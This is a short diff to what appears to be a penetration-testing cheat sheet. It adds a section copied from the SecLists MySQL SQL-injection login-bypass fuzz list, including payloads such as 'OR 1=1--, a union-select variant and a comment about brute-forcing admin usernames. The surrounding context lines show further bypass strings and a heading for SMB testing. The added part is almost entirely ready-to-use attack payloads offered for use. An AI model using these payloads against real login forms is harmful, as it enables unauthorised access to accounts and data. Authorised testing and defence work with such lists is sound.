@@ -74,6 +74,18 @@
 | 1' or 1=1 -- - | blah |
 | whatever' or '1'='1 | whatever' or '1'='1 |
 
+#### MySQL-SQLi-Login-Bypass.fuzzdb.txt
+- [SecLists Fuzzing](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post_page-----c95930e9523d--------------------------------)
+```
+# regex replace as many as you can with your fuzzer for best results:
+# <user-fieldname> <pass-fieldname> <username>
+# also try to brute force a list of possible usernames, including possile admin acct names
+<username>' OR 1=1--
+'OR '' = '	Allows authentication without a valid username.
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+```
 ### <ins>139/445 - SMB</ins>
 
 #### Try
